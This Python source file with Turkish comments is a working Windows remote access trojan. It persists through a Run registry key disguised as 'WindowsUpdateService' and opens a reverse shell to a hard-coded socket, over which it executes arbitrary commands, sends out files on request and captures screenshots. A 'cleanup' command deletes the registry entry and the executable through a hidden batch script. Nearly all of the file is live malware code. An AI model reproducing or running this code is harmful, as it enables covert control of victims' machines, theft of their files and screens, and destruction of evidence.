import socket
import json
import subprocess as su
import os
import sys
import mss
import mss.tools
import winreg as reg

# 1. Kalıcılık Sağlama (Registry'ye Ekleme)
def set_persistence():
    try:
        # Çalışan exe'nin veya scriptin yolunu al
        if getattr(sys, 'frozen', False):
            path = sys.executable
        else:
            path = os.path.abspath(__file__)
            
        key_val = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_val, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(key, "WindowsUpdateService", 0, reg.REG_SZ, path)
        reg.CloseKey(key)
    except Exception:
        pass

# 2. Kendini ve İzleri Tamamen Temizleme (Self-Destruct)
def self_destruct():
    try:
        # Kayıt defterindeki kalıcılık izini sil
        key_val = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_val, 0, reg.KEY_ALL_ACCESS)
        reg.DeleteValue(key, "WindowsUpdateService")
        reg.CloseKey(key)
    except Exception:
        pass


    try:
        # Çalışan dosyanın kendisini silmesi için batch komutu oluştur ve çalıştır
        if getattr(sys, 'frozen', False):
            current_exe = sys.executable
            bat_script = f"""
            @echo off
            timeout /t 2 /nobreak > nul
            del /f /q "{current_exe}"
            del "%~f0"
            """
            with open("cleanup.bat", "w") as f:
                f.write(bat_script)
            su.Popen("cleanup.bat", shell=True, creationflags=su.CREATE_NO_WINDOW)
    except Exception:
        pass

# Program çalıştırıldığında kalıcılığı aktif et ve tuzak dosyayı aç
set_persistence()


def j_send(data):
    jsondata = json.dumps(data)
    sock.send(jsondata.encode())

def j_recv():
    data = ''
    while True:
        try:
            data = data + sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = j_recv()

        if command == 'quit':
            break

        # Terminalden 'cleanup' komutu gelirse kendini imha et
        elif command == 'cleanup':
            j_send("[+] Sistemden izler siliniyor ve imha ediliyor...")
            self_destruct()
            break

        elif command[:3] == 'cd ':
            try:
                os.chdir(command[3:].strip())
                j_send(f"[+] Directory changed to {os.getcwd()}")
            except Exception as e:
                j_send(str(e))
            continue

        elif command.startswith('download '):
            filename = command[9:].strip()
            if os.path.exists(filename) and os.path.isfile(filename):
                with open(filename, 'rb') as f:
                    file_data = f.read()
                j_send(len(file_data))
                sock.sendall(file_data)
            else:
                j_send(0)
            continue

        elif command == 'screenshot':
            try:
                with mss.MSS() as sct:
                    sct_img = sct.grab(sct.monitors[1])
                    png_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size)
                j_send(len(png_bytes))
                sock.sendall(png_bytes)
            except Exception:
                j_send(0)
            continue

        execute = su.Popen(command, shell=True, stdout=su.PIPE, stderr=su.PIPE, stdin=su.PIPE)
        result = (execute.stdout.read() + execute.stderr.read()).decode('cp857', errors='ignore')
        j_send(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 1234))
shell()